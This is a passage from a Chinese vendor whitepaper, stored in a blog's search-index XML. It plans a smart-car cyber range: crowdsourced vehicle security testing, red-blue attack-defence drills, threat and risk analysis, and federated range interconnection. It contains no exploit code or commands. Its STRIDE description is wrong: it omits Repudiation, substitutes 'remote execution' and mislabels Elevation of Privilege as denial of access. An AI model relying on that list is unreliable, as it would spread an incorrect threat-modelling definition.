<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>靶场基础设施白皮书</title>
      <link href="posts/a8b0a0ab/"/>
      <url>posts/a8b0a0ab/</url>
      
        <content type="html"><![CDATA[<p><strong>靶场基础设施</strong></p><p><strong>技术白皮书</strong></p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/f0f87ae178beabba34ab47812799c4cb.png"></p><p>浙江国利网安科技有限公司</p><p>目录</p><p><a href="#_Toc156419990">1 智能汽车网络靶场众测活动模块</a></p><p><a href="#%E6%8A%80%E6%9C%AF%E8%B7%AF%E7%BA%BF">1.1 技术路线</a></p><p><a href="#_Toc156419992">1.1.1 测试活动方案</a></p><p><a href="#_Toc156419993">1.1.2 众测活动规划方案响应</a></p><p><a href="#%E6%94%BB%E9%98%B2%E6%BC%94%E7%BB%83%E6%B4%BB%E5%8A%A8%E8%A7%84%E5%88%92%E6%96%B9%E6%A1%88">1.1.3 攻防演练活动规划方案</a></p><p><a href="#%E6%B5%8B%E8%AF%95%E5%88%86%E6%9E%90%E6%B4%BB%E5%8A%A8%E8%A7%84%E5%88%92%E6%96%B9%E6%A1%88">1.1.4 测试分析活动规划方案</a></p><p><a href="#%E8%81%94%E9%82%A6%E4%BA%92%E8%81%94%E6%B4%BB%E5%8A%A8%E8%A7%84%E5%88%92%E6%96%B9%E6%A1%88">1.1.5 联邦互联活动规划方案</a></p><p><a href="#%E6%99%BA%E8%83%BD%E6%B1%BD%E8%BD%A6%E7%BD%91%E7%BB%9C%E9%9D%B6%E5%9C%BA%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E6%A1%86%E6%9E%B6">2 智能汽车网络靶场基础设施建设框架</a></p><p><a href="#_Toc156419998">2.1 总体概述</a></p><p><a href="#%E7%B3%BB%E7%BB%9F%E6%A6%82%E8%BF%B0">2.1.1 系统概述</a></p><p><a href="#%E7%B3%BB%E7%BB%9F%E7%BB%84%E6%88%90">2.1.2 系统组成</a></p><p><a href="#_Toc156420001">3 智能汽车网络靶场网络资源设备</a></p><p><a href="#%E6%8A%80%E6%9C%AF%E8%B7%AF%E7%BA%BF-1">3.1 技术路线</a></p><p><a href="#_Toc156420003">3.1.1 网络规划</a></p><p><a href="#_Toc156420004">3.1.2 网络布线</a></p><p><a href="#_Toc156420005">3.1.3 服务器</a></p><p><a href="#_Toc156420006">3.1.4 机房设备</a></p><p><a href="#_Toc156420007">3.1.5 网络设备</a></p><p><a href="#_Toc156420008">3.1.6 网络安全防护</a></p><p><a href="#_Toc156420009">3.1.7 其他资产设备</a></p><p><a href="#_Toc156420010">4 智能驾驶网络靶场沙盘</a></p><p><a href="#_Toc156420011">4.1 技术路线</a></p><p><a href="#%E6%99%BA%E8%83%BD%E9%A9%BE%E9%A9%B6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B2%99%E7%9B%98">4.1.1 智能驾驶网络安全沙盘</a></p><p><a href="#%E6%99%BA%E8%83%BD%E9%A9%BE%E9%A9%B6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9C%BA%E6%99%AF">4.1.2 智能驾驶网络安全场景</a></p><p><a href="#%E6%99%BA%E8%83%BD%E6%B1%BD%E8%BD%A6%E7%BD%91%E7%BB%9C%E9%9D%B6%E5%9C%BA%E5%8A%A8%E6%80%81%E4%BB%BF%E7%9C%9F%E7%B3%BB%E7%BB%9F">5 智能汽车网络靶场动态仿真系统</a></p><p><a href="#%E7%9B%AE%E6%A0%87">5.1 目标</a></p><p><a href="#%E6%8A%80%E6%9C%AF%E8%B7%AF%E7%BA%BF-3">5.2 技术路线</a></p><p><a href="#%E9%A9%BE%E9%A9%B6%E8%88%B1">5.2.1 驾驶舱</a></p><p><a href="#%E8%BF%90%E5%8A%A8%E5%B9%B3%E5%8F%B0">5.2.2 运动平台</a></p><p><a href="#%E8%BD%A6%E8%BE%86%E5%8A%A8%E5%8A%9B%E5%AD%A6%E6%A8%A1%E5%9E%8B">5.2.3 车辆动力学模型</a></p><p><a href="#%E5%BD%B1%E5%83%8F%E7%B3%BB%E7%BB%9F">5.2.4 影像系统</a></p><p><a href="#%E9%81%93%E8%B7%AF%E4%BA%A4%E9%80%9A%E5%9C%BA%E6%99%AF%E4%BB%BF%E7%9C%9F%E8%BD%AF%E4%BB%B6">5.2.5 道路交通场景仿真软件</a></p><p><a href="#%E8%87%AA%E5%8A%A8%E9%A9%BE%E9%A9%B6%E6%94%BB%E9%98%B2%E6%BC%94%E7%A4%BA%E5%9C%BA%E6%99%AF">5.2.6 自动驾驶攻防演示场景</a></p><p><a href="#%E6%8A%80%E6%9C%AF%E5%AE%9E%E7%8E%B0">5.2.7 技术实现</a></p><p><a href="#_Toc156420024">6 智能汽车网络靶场攻防演练大屏系统</a></p><p><a href="#%E7%9B%AE%E6%A0%87-1">6.1 目标</a></p><p><a href="#%E6%8A%80%E6%9C%AF%E8%B7%AF%E7%BA%BF-4">6.2 技术路线</a></p><p><a href="#%E5%85%A8%E5%BD%A9led%E6%98%BE%E7%A4%BA%E5%B1%8F">6.2.1 全彩LED显示屏</a></p><p><a href="#led%E5%8F%91%E9%80%81%E7%9B%92">6.2.2 LED发送盒</a></p><p><a href="#%E6%8E%A7%E5%88%B6%E7%94%B5%E8%84%91">6.2.3 控制电脑</a></p><p><a href="#%E7%AE%A1%E7%90%86%E8%BD%AF%E4%BB%B6">6.2.4 管理软件</a></p><p><a href="#%E8%A7%86%E9%A2%91%E6%8B%BC%E6%8E%A5%E5%99%A8">6.2.5 视频拼接器</a></p><p><a href="#%E6%9C%BA%E6%9F%9C">6.2.6 机柜</a></p><p><a href="#%E9%85%8D%E7%94%B5%E6%9F%9C">6.2.7 配电柜</a></p><p><a href="#%E9%92%A2%E6%9E%B6%E7%BB%93%E6%9E%84">6.2.8 钢架结构</a></p><p><a href="#%E7%BA%BF%E9%98%B5%E5%88%97%E9%9F%B3%E6%9F%B1">6.2.9 线阵列音柱</a></p><p><a href="#%E5%A4%9A%E5%8A%9F%E8%83%BD%E5%95%86%E7%94%A8%E5%8A%9F%E7%8E%87%E6%94%BE%E5%A4%A7%E5%99%A8">6.2.10 多功能商用功率放大器</a></p><p><a href="#%E6%97%A0%E7%BA%BF%E6%89%8B%E6%8C%81%E8%AF%9D%E7%AD%92">6.2.11 无线手持话筒</a></p><p><a href="#%E9%9F%B3%E9%A2%91%E5%A4%84%E7%90%86%E5%99%A8">6.2.12 音频处理器</a></p><p><a href="#%E8%B0%83%E9%9F%B3%E5%8F%B0">6.2.13 调音台</a></p><p><a href="#%E9%85%8D%E5%A5%97%E8%BE%85%E6%9D%90">6.2.14 配套辅材</a></p><p><a href="#_Toc156420041">7 智能汽车网络靶场攻防演练车辆台架</a></p><p><a href="#%E7%9B%AE%E6%A0%87-2">7.1 目标</a></p><p><a href="#%E6%8A%80%E6%9C%AF%E8%B7%AF%E7%BA%BF-5">7.2 技术路线</a></p><p><a href="#%E5%AE%9E%E8%BD%A6%E5%8F%B0%E6%9E%B6%E6%96%B9%E6%A1%88">7.2.1 实车台架方案</a></p><p><a href="#_Toc156420045">7.2.2 电子电器零部件方案</a></p><p><a href="#_Toc156420046">7.2.3 车端软件方案</a></p><p><a href="#_Toc156420047">7.2.4 仿真云平台方案</a></p><h1 id="智能汽车网络靶场众测活动模块"><a href="#智能汽车网络靶场众测活动模块" class="headerlink" title="智能汽车网络靶场众测活动模块"></a>智能汽车网络靶场众测活动模块</h1><h2 id="技术路线"><a href="#技术路线" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="测试活动方案"><a href="#测试活动方案" class="headerlink" title="测试活动方案"></a>测试活动方案</h3><p>本活动方案包含活动简介、历届活动、组织架构、日程安排、奖项设置、比赛项目、比赛规则、选手须知、裁判规则、禁止条例形成的活动企划书。</p><h3 id="众测活动规划方案响应"><a href="#众测活动规划方案响应" class="headerlink" title="众测活动规划方案响应"></a>众测活动规划方案响应</h3><h4 id="功能实施方案"><a href="#功能实施方案" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>智能汽车网络靶场众测活动规划方案综合考虑了活动简介、历届活动、组织架构、日程安排、奖项设置、比赛项目、比赛规则、选手须知、裁判规则、禁止条例等要点。通过该方案，参与者可以了解活动背景和目的，并且确保活动的有序进行和公正评选。</li><li>活动简介主要介绍活动的目的、背景，活动的内容、形式以及主题，以便参与者和相关人员能够了解活动的基本情况，明确目标和规则。</li><li>包含活动的组织架构，即主要负责人、组委会成员以及专家组、裁判组各个工作组的职责和联系方式。这样可以确保活动的顺利进行，并提供参与者和相关人员的沟通渠道。</li><li>详细说明活动的日程安排、活动事项、时间、地点，包括开幕式、比赛时间、评审时间、颁奖典礼等。这有助于参与者和相关人员合理安排时间，遵循活动的时间安排。</li><li>活动的奖项设置覆盖名称、名额数量、获奖证书、获得的奖励，包括一、二、三等奖以及最佳团队奖、最佳创新奖等。同时，列举奖项的具体评选标准和评审流程，确保奖项的公正性和权威性。</li><li>详细说明比赛的参与人数、团队数量，以及参赛者的背景和层次，以及比赛的规模介绍、内容、时长和环境。详细描述每个比赛项目的具体内容、目标和要求，说明选手需要完成的任务、挑战或测试，以及相应的技术要求和限制。说明每个比赛项目的时间安排和持续时间。包括比赛的开始时间、截止时间，以及可能存在的预赛、决赛等阶段。介绍比赛所使用的硬件设备、软件工具和网络环境</li><li>将制定并公布比赛规则，包括报名规则、积分与晋级规则、赛题评分规则以及漏洞评分规则等。这些规则将确保比赛的公平性和公正性。同时，还将提供规则的详细解释和示例，以帮助参与者更好地理解规则的要求和实施方式。包括是否有限制参赛人数或团队规模，以及需要提供的报名材料或信息。说明比赛中的积分计算方法和晋级规则。同时也说明晋级到下一轮的选手数量和方式及每个比赛项目的评分标准和方法。包括对于完成任务的准确性、效率、创新性等方面的评价标准，以及相应的评分细则和权重。对于漏洞挖掘项目，说明评估漏洞的标准和方法。包括对于漏洞的危害程度、复现难度、影响范围等方面进行评估，并给出相应的评分细则和权重。</li><li>制定的裁判规覆盖裁判的分工和职责，明确每个裁判的职责和分工，总裁判负责确保比赛的公平性和顺利进行，项目裁判负责评判各个比赛项目的表现和成绩</li><li>将制定并提交网络和电力规划方案。网络规划方案将涵盖网络架构、设备配置、网络安全等方面的内容，以确保网络连接的稳定性和安全性，确保活动期间电力供应的可靠性和连续性。网络规划方案是指为靶场环境提供稳定、高效的网络连接，并确保网络安全的方案。在规划方案中需要考虑网络拓扑结构、网络设备配置、网络带宽、子网划分、IP地址分配和域名解析等问题。电力规划方案是指为靶场环境提供稳定、可靠的电力供应，并确保设备安全的方案。</li><li>根据众测活动的具体需求，确定所需的各种零部件，选择合适的台架设备，确定车辆接入方案。确保将所需的零部件和台架与车辆进行连接和集成，这包括确定接口类型和数量，以便与车辆系统进行通信和数据交换。常见的接口类型包括CAN总线、Ethernet、USB等。</li><li>提供与智能汽车网络靶场动态测试接入网关的集成方案，集成方案包括硬件选型、软件开发、系统对接、数据安全、性能优化和监控等方面的内容，以确保网关能够稳定、安全地处理测试数据，并与其他系统实现良好的集成。</li><li>提供禁止条例，明确规定参与者对测试数据和机密信息的保密义务，同时提供相应的保密措施和管理机制，确保测试数据的安全性和保密性。攻击方式限制是指禁止参与者使用某些特定的攻击方式或工具进行攻击。在众测活动中，可能会出现一些攻击方式或工具，这些攻击方式可能会对系统造成严重的损害。</li><li>选手申诉方案明确规定选手可以提出申诉的事项、申诉的时间限制、申诉的途径以及申诉的处理流程等内容。申诉表模板包含必要的信息，如选手姓名、联系方式、申诉事项、申诉理由、证据材料等。</li><li>提供活动方案所需的物料清单，包含服务器和计算设备、网络设备、智能汽车网络靶场软件、操作系统、测试设备和工具、申诉和评估工具、安全设备和措施等</li><li>费用构成是指费用所包含的各种项目和分类，如硬件设备、软件系统、测试设备、申诉和评估工具、人工成本等。价格是指每个项目或分类的单价或成本，如硬件设备的购买成本、软件系统的授权费用、人工成本的薪资等。数量是指每个项目或分类所需要的数量或规模。</li><li>在靶场中创建众测场景模板工程的步骤包括：确定众测场景、设计场景模板、配置测试设备、设置测试参数、验证场景模板、优化和改进。</li></ol><h4 id="技术实现内容"><a href="#技术实现内容" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>汽车安全众测活动组织旨在通过广泛参与，评估车辆系统的安全性。通过众测，发现并修复潜在漏洞，保护车辆和乘客免受攻击。活动包括漏洞扫描、渗透测试和代码审查等多种方法，覆盖车辆内部系统、通信接口和软件应用。测试结果将分析和评估，提供改进建议和风险管理措施。通过众测活动，促进汽车信息安全的提升，确保车辆的可靠性和乘客的安全。</p><p>活动组织方式及内容符合文件要求，以下为活动企划书：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/a747a8a9595e089ef73f67b7288af228.png"></p><h3 id="攻防演练活动规划方案"><a href="#攻防演练活动规划方案" class="headerlink" title="攻防演练活动规划方案"></a>攻防演练活动规划方案</h3><ol><li></li></ol><h4 id="功能实施方案-1"><a href="#功能实施方案-1" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li><p>提供的攻防演练活动至少包含以下内容；</p></li><li><p>组织单位负责整个攻防演练活动的组织和协调工作。包括组织单位、技术支撑单位、攻击队伍、防守队伍。技术支撑单位为攻防演练活动提供技术支持和设备支持的单位或团队。攻击队伍：由专业的网络安全专家或红队组成的攻击团队。他们模拟真实的黑客攻击行为，尝试入侵智能汽车网络系统，突破安全漏洞，并获取对网络系统的控制权。防守队伍：由智能汽车网络系统的开发人员、网络安全专家或蓝队组成的防守团队。</p></li><li><p>能够明确、清晰地定义各组织要素的职能、角色和任务目标，组织单位负责整个攻防演练活动的组织和协调工作。技术支撑单位为演练活动提供技术和设备支持。攻击队伍模拟黑客攻击行为，寻找系统漏洞并获取对系统的控制权。防守队伍保护系统免受攻击，检测和应对攻击行为，修补漏洞并提高系统安全性。</p></li><li><p>攻防演练可以采用不同的组织形式，具体的组织关键内容包括以下几个方面。</p><p>演习范围：确定攻防演练的具体范围，例如智能汽车网络系统的特定部分或整个系统。</p><p>周期：确定演练的周期，包括开始时间、结束时间和各个阶段的时间安排。</p><p>场地：选择合适的场地进行演练活动，可以是实际的汽车网络系统环境或模拟环境。</p><p>设备：确保演练所需的设备齐全，包括服务器、网络设备、攻击和防守工具等。</p><p>攻防队伍组建：组建攻击队伍和防守队伍，确定队伍的人数和成员，确保攻防双方有足够的技术能力和经验参与演练。</p><p>规则制定：制定明确的规则，包括允许的攻击行为和防守措施、禁止的行为、奖惩制度等，确保演练活动的公平性和安全性。</p><p>视频录制：进行演练活动的视频录制，以便后期分析和评估演练的效果，并作为培训和宣传的材料。</p></li><li><p>攻防演练的组织阶段包括组织策划阶段、前期准备阶段、实战演练阶段和演练总结阶段。组织策划阶段涉及确定演练目标和任务，前期准备阶段包括培训人员和搭建靶场环境，实战演练阶段模拟黑客攻击和实施防御措施，演练总结阶段对演练过程和结果进行评估和总结，并提出改进建议。</p></li><li><p>不同演练阶段的工作内容应该清晰定义，包括准备阶段、攻击阶段、防御阶段和评估与总结阶段。准备阶段涉及制定计划、培训人员、搭建靶场环境。攻击阶段模拟黑客攻击、收集数据和信息以及制定修复方案。防御阶段部署安全措施、监控网络并修复系统。评估与总结阶段对整个演练进行评估、总结经验并提出改进意见。</p></li><li><p>支持不同的演训类型，包括竞赛夺旗演练、红蓝对抗演练和综合演练。竞赛夺旗演练通过设立旗帜目标来评估参与者的攻击和防御能力，红蓝对抗演练模拟攻击方（红队）与防守方（蓝队）之间的对抗，综合演练则是综合考虑多种攻击和防御要素进行全面演练。这些不同的演训类型有助于提供多样化的场景和挑战，以测试和提升智能汽车网络系统的安全性和防护能力。</p></li><li><p>演练组织负责整个演练过程的组织和协调，包括人员安排、场地准备和设备调试等。演练目标应该明确表述测试的是智能汽车网络系统的哪些安全性和防护能力。演练规则应该详细说明参与者的权限和行为规范，以及如何处理演练中出现的问题。演练流程应该包括准备、实施和总结三个阶段，涵盖演练前、演练中和演练后的所有环节和工作。</p></li><li><p>支撑搭建演练平台，包括不限于攻击场地、防守场地、攻击目标、攻击分析中心、指挥大厅，攻击场地是模拟真实环境的网络系统，提供给攻击方进行攻击的场所；防守场地则是为防守方提供的网络系统，用于部署防御措施。攻击目标是在系统中设定的具有漏洞和弱点的目标，用于评估参与者的攻击能力。攻击分析中心是负责收集和分析攻击数据的中心，用于监测和评估演练过程中的攻击情况。指挥大厅是指挥人员进行指挥和协调的地方，用于统一指挥演练活动的进行。这些演练平台的搭建将为活动提供逼真的环境和有效的指挥管理。</p></li><li><p>支撑演练活动管理，其中包括场景定义、任务定义、任务顺序定义、队伍配置、自动环境分配、靶标分配、靶标检测工具支撑、演练成果实时查看、成果提交、统计排名、演练停止与恢复以及演练报告与归档等。这些管理功能将为活动提供灵活的场景设置、明确的任务要求、合理的队伍配置和自动化的环境分配。同时，靶标分配和靶标检测工具将帮助参与者评估攻击效果。演练成果实时查看、成果提交和统计排名将为参与者提供及时反馈和比较。演练停止与恢复功能可在必要时进行控制，而演练报告与归档则有助于总结经验和保留活动记录。这些管理支撑措施将提高演练活动的效率和管理水平。</p></li><li><p>应急保障措施包括应急预案、安全检查、问题处置流程、备件储备、备份数据存储、应急通讯和应急救援等方面。</p></li><li><p>准备内容包括资源准备和人员准备。资源准备方面，需要确保演练平台的搭建和配置，包括攻击场地、防守场地、攻击目标、攻击分析中心和指挥大厅等。人员准备方面，需要确保参与者具备相关的技术能力和知识背景，可以有效地参与演练活动。同时，需要指定演练的指挥人员和技术支持人员，以确保演练的顺利进行和问题的及时解决。</p></li><li><p>演练活动的过程需要依据演习策划内容，协调攻击方和防守方，并在过程中展开监控、研判、应急处置等工作。在演练过程中，需要确保攻击方和防守方遵循演习策划内容并按照规定的流程进行操作。同时，需要对演练过程进行实时监控和研判，对攻击效果进行评估，并根据需要进行应急处置。</p></li><li><p>攻防演练活动的核心保障工作包括人员安全保障、攻击过程监控、专家研判、攻击过程回溯、信息通告、人员保障、资源保障、后勤保障和应急处置。这些工作内容将确保参与者的人身安全，监控攻击过程并及时做出研判，回溯攻击过程以分析漏洞，通告相关信息给演习参与者，提供必要的人员和资源保障，提供后勤支持，以及在突发情况下进行应急处置。</p></li><li><p>总结阶段工作内容包括演练恢复、演练总结和评估建议。在演练恢复过程中，需要对演练环境进行清理和重置，确保下次演练的顺利进行。演练总结阶段将对演练过程进行详细回顾和总结，包括演习参与者的表现、攻防效果、发现的问题和改进的建议等。最后，根据演练总结和评估结果，提出相应的评估建议，以指导未来的演练改进和加强网络安全防护能力。</p></li><li><p>实战攻防演练面临着一定的风险，为规避这些风险，可以采取以下措施：在演习前进行全面的准备工作，包括演习策划、参与者培训和演习环境搭建等；确保演习过程中参与者的人身安全和设备安全，采取必要的安全措施和保障措施；建立完善的应急预案和处置机制，以确保在演习过程中出现问题时能够及时处理和解决问题。</p></li><li><p>根据规划方案创建攻防演练场景模板工程，这个过程包括制定靶场场景的设计方案、配置场景中的设备和系统、建立攻击和防御机制等。创建好的攻防演练场景模板工程将成为以后演练活动的基础，可以通过对其进行调整和优化来满足不同演练需求。</p></li></ol><h4 id="技术实现内容-1"><a href="#技术实现内容-1" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>攻防对抗比赛活动组织旨在模拟真实网络环境下的攻击和防御情景，促进网络安全技能的提升。参与者分为攻击方和防御方，通过攻击和防御操作竞争得分。比赛包括网络漏洞扫描、渗透测试、恶意代码分析等挑战，涵盖系统、应用和网络层面。比赛结果根据得分和时间评判，最终颁发奖项。活动组织需制定比赛规则、提供测试环境和工具，确保公平公正。攻防对抗比赛活动激发参与者的技术竞争力，推动网络安全技术的发展。活动方案包含：</p><p><strong>组织要素</strong></p><p>包含组织单位、技术支撑单位、攻击队伍、防守队伍，清晰定义各组织要素的职能、角色和任务目标。</p><p><strong>组织形式</strong></p><p>说明不同组织形式下的组织关键内容，包括演习范围、周期、场地、设备、攻防队伍组建、规则制定、视频录制等多方面；</p><p>定义阶段</p><p>包含演习阶段、策划阶段、前期准备阶段、实战演练阶段、演练总结阶段；</p><p><strong>阶段工作内容定义</strong></p><p>包含内容策划，支持基于不同的演训类型进行内容策划，包括竞赛夺旗演练、红蓝对抗演练、综合演练，组织内容，清晰定义演练组织、演练目标、演练规则、演练流程；</p><p><strong>演练平台搭建</strong></p><p>包含攻击场地、防守场地、攻击目标、攻击分析中心、指挥大厅；</p><p><strong>演练配置</strong></p><p>包含演练活动管理，场景定义、任务定义、任务顺序定义、队伍配置、自动环境分配、靶标分配、靶标检测工具支撑、演练成果实时查看、成果提交、统计排名、演练停止与恢复、演练报告与归档；</p><p><strong>应急保障措施</strong></p><p>包含准备内容，至少清晰定义演练准备的资源准备、人员准备；清晰定义演练过程的，定义如何依据演习策划内容，协调攻击方和防守方，并在过程中展开监控、研判、应急处置等工作；定义演习保障的核心工作内容，包含人员安全保障、攻击过程监控、专家研判、攻击过程回溯、信息通告、人员保障、资源保障、后勤保障、应急处置；</p><p><strong>演习总结</strong></p><p>清晰定义演习总结阶段工作内容，包含演练恢复、演练总结、评估建议；清晰定义实战攻防演练的风险规避措施。</p><p><strong>其他</strong></p><p>根据方案在靶场中创建攻防演练场景模板工程；</p><h3 id="测试分析活动规划方案"><a href="#测试分析活动规划方案" class="headerlink" title="测试分析活动规划方案"></a>测试分析活动规划方案</h3><ol><li></li></ol><h4 id="功能实施方案-2"><a href="#功能实施方案-2" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>提供的测试分析活动至少包含以下内容；</li><li>为了对整车信息进行调研，可以采用问卷调查或现场访谈的方式。通过这种方式，可以获取关于整车架构、关键功能特性和访问点等方面的详细信息。这些信息对于后续的测试和分析工作非常重要，可以帮助评估车辆的安全性和潜在漏洞。</li><li>根据信息调研的结果进行功能定义，应采用数据流图的方法对评估对象进行描述。通过数据流图，可以清晰地划定评估对象的范围，识别其功能单元、数据流、数据存储以及物理和逻辑边界等要素。数据流图的绘制可以帮助理解评估对象的功能定义，为后续的测试和分析提供指导和基础。</li><li>在测试分析活动中，资产识别是非常重要的一步。通过功能定义阶段的数据流图，可以对智能汽车网络中的安全资产进行准确、全面的识别。这些安全资产包括各个功能单元、数据流、数据存储和外部实体等，并且对这些安全资产的网络安全属性进行分析，以了解它们可能面临的安全威胁和攻击场景。</li><li>威胁场景识别是在智能汽车网络靶场测试分析中的关键步骤。采用STRIDE2方法，结合资产、网络安全属性和危害场景，可以准确地识别出资产实体所面临的各种威胁场景。这样的识别可以帮助了解潜在的威胁和攻击方式，从而制定相应的安全策略，保护智能汽车网络免受安全威胁。</li><li>采用攻击树的方法，结合现阶段国内外汽车信息安全事件，对智能汽车网络中可能出现的攻击路径进行深入分析。通过这样的分析，可以了解攻击者可能采取的攻击方式、攻击手段和攻击目标，从而制定相应的防御措施，保障智能汽车网络的安全性。</li><li>基于安全资产的危害场景及其面临的潜在威胁，结合具体业务功能和特定的应用场景，从危害可能造成的严重程度以及攻击成功的可能性两个方面进行风险分析及评估，确定被评估资产对象的网络安全风险等级。通过这样的评估，可以对不同的安全资产对象进行分类，按照风险等级高低排序，并制定相应的安全措施，以防范潜在的安全威胁，提高智能汽车网络的安全性和稳定性。</li></ol><h4 id="技术实现内容-2"><a href="#技术实现内容-2" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>测试分析活动为了评估和分析车载相关系统、应用程序或零部件安全风险的行为，该活动主要通过信息调研、功能定义、资产识别、威胁场景识别、攻击路劲分析、风险评估等方式来定义汽车的网络安全等级级风险点。</p><p>本方案组织的针对整车信息安全的测试分析活动内容主要包含：</p><p><strong>信息调研：</strong></p><p>通过问卷调查或现场访谈，收集整车架构、关键功能特性和访问点等信息，以了解车辆的技术构成、主要功能和用户接口，为进一步研究和改进提供基础数据。</p><p><strong>功能定义：</strong></p><p>通过对调研收集的信息，采用数据流图的方法对评估对象进行描述。评估对象的范围被确定，功能单元、数据流、数据存储以及物理和逻辑边界被识别。数据流图展示了评估对象内部的信息流动和处理过程，帮助理解系统的组成部分、数据传递路径和与外部系统的交互。通过这种方式，可以更好地分析和评估评估对象的功能和性能。</p><p><strong>资产识别：</strong></p><p>在功能定义阶段，通过输出的数据流图识别安全资产。这包括功能单元、数据流、数据存储和外部实体等内容。然后，识别安全资产的网络安全属性，并分析资产可能面临的危害场景。通过这个过程，可以确定系统中的关键资产、其在系统中的位置和流动路径，并评估潜在的安全威胁和攻击场景，以便制定相应的安全保护措施和风险应对策略。</p><p><strong>威胁场景识别：</strong></p><p>采用STRIDE2方法，结合资产、网络安全属性和危害场景，进行资产实体的威胁场景识别。STRIDE2方法考虑以下威胁类型：拒绝服务（Denial of Service）、信息泄露（Information Disclosure）、篡改（Tampering）、冒充（Spoofing）、远程执行（Remote Execution）和拒绝访问（Elevation of Privilege）。通过分析每个资产实体的网络安全属性，如身份验证、访问控制和数据加密，识别潜在的威胁场景。这样可以帮助系统设计人员更好地了解资产的安全风险，并采取相应的防护措施来减轻或消除这些威胁。</p><p><strong>攻击路径分析：</strong></p><p>采用攻击树的方法，并参考现阶段国内外汽车信息安全事件，分析攻击路径。攻击树是一种图形化的工具，用于描述攻击者实现目标所需的步骤和条件。通过分析已发生的汽车信息安全事件，可以识别出潜在的攻击路径。这些攻击路径可能涉及车载系统的漏洞利用、远程攻击、物理接口攻击等。通过绘制攻击树，可以清晰地展示攻击者的思维过程和攻击路径，帮助系统设计人员识别并强化系统的安全防护措施，以保护汽车信息系统免受潜在的攻击威胁。</p><p><strong>风险评估：</strong></p><p>基于安全资产的危害场景及其面临的潜在威胁，结合具体业务功能和应用场景，进行风险分析和评估。首先，根据危害的严重程度和攻击成功的可能性两个方面，对潜在威胁进行评估。严重程度包括信息泄露、系统瘫痪、用户安全受损等，攻击成功的可能性则考虑攻击者的技术能力、资源和动机等因素。然后，根据评估结果，确定被评估资产对象的网络安全风险等级，如高、中、低风险等级。这样可以帮助决策者了解资产的风险状况，优先采取相应的安全措施来降低潜在威胁的风险影响。</p><h3 id="联邦互联活动规划方案"><a href="#联邦互联活动规划方案" class="headerlink" title="联邦互联活动规划方案"></a>联邦互联活动规划方案</h3><ol><li></li></ol><h4 id="功能实施方案-3"><a href="#功能实施方案-3" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li>提供的联邦互联活动至少包含以下内容；</li><li>联邦互联场景内容策划涵盖需要参与联邦互联的场景，场景之间的对接方式以及定义场景的访问顺序。通过这些策划，不同智能汽车网络场景可以有效互联，实现功能和性能验证。</li><li>联邦互联场景组织，包括定义互联活动组织、目标规则流程等内容。通过清晰地定义互联活动组织和目标规则流程，可以确保联邦互联场景能够按照规定的流程有序进行，实现有效的测试和验证。</li><li>支撑搭建平台，包括攻击场地、防守场地、攻击目标、攻击分析中心和指挥大厅等。这些平台的搭建可以为联邦互联场景提供必要的技术支持和实验环境，包括模拟攻击和防御行为、收集和分析数据等，从而有效促进联邦互联场景的测试和验证。</li><li>支撑互联活动管理，包括场景定义、任务定义、任务顺序定义、队伍配置等功能，还有自动环境分配和靶标分配，以及靶标检测工具的支持。同时，用户可以实时查看互联活动的成果，提交自己的成果，并进行统计排名。此外，方案还支持互联活动的停止与恢复，并提供报告与归档功能，使整个活动过程更加高效和便捷。</li><li>提供了详细的准备内容，定义所需的资源，包括硬件设备、软件工具和网络连接等。同时，规划人员配置，包括技术人员、测试人员和管理人员等。通过合理分配资源和人员，确保互联活动准备的顺利进行，为后续的测试活动奠定坚实基础。</li><li>清晰定义活动的过程，详细描述了如何根据互联活动策划内容，协调各个场景方之间的合作，并在整个过程中进行监控、研判和应急处置等工作。通过有效的协调和监控，确保活动的顺利进行，及时应对可能出现的问题，以保证活动的顺利进行和最终的成功。</li><li>清晰定义互联活动保障的核心工作内容，包括人员安全保障、攻击过程监控、专家研判、攻击过程回溯、信息通告、人员保障、资源保障、后勤保障和应急处置等方面。通过这些工作内容的明确定义和有序执行，确保互联活动的顺利进行，并提供必要的保障措施，以应对可能出现的问题和应急情况，保证活动的安全性、高效性和成功性。</li><li>清晰定义互联活动总结阶段工作内容，包括互联活动回溯、演练总结和评估建议等方面。在这个阶段，通过对整个活动的回顾和总结，分析活动中出现的问题和不足之处，提出改进和优化的建议，为今后类似活动的开展提供借鉴和指导。同时，也为活动的成功收官提供重要的保障和支持。</li><li>清晰定义互联活动的风险规避措施，包括加强安全意识教育和培训、建立完善的安全保障机制、采用先进的技术手段和防护措施、定期进行演练和测试、完善应急预案和处置流程等多个方面。通过这些措施的落实，有效地降低互联活动所面临的各种风险和威胁，确保活动的安全性、高效性和成功性。</li><li>联邦靶标构想，包括靶标的flag值、攻击手段、得分点、是否为公用靶标、所属靶场、访问形式和访问地址等要素。这些联邦靶标旨在为活动参与者提供具体的攻击目标，并定义其攻击手段和得分规则，以便进行有针对性的演练和测试。同时，还明确了靶标是否为公用，以及相关访问信息，确保活动的顺利进行和参与者的有效操作。</li><li>联邦互联场景描述，包括场景的拓扑描述，包含节点名称、地址和访问端口等信息，以便参与者清楚地了解各节点之间的连接关系和访问方式。此外，还包含联邦靶场区域描述，包括靶场所在地、靶标区域划分和网段划分等内容，确保参与者对靶场的边界和范围有清晰的认识。</li><li>联邦互联场景协同方案，其中包括单场景协同，包含场景传统攻击方式描述，并详细描述了场景与其他靶场协同时的攻击方式和攻击步骤，同时提供参考实施方案，包括节点及拓扑情况、节点之间的通信协议、flag分布情况以及获取flag需要采用的攻击方式简述等要素。</li><li>联邦互联网络规划，包括整体联邦互联场景的网络IP地址段、VLAN划分和VPN划分规划，提供网络连接规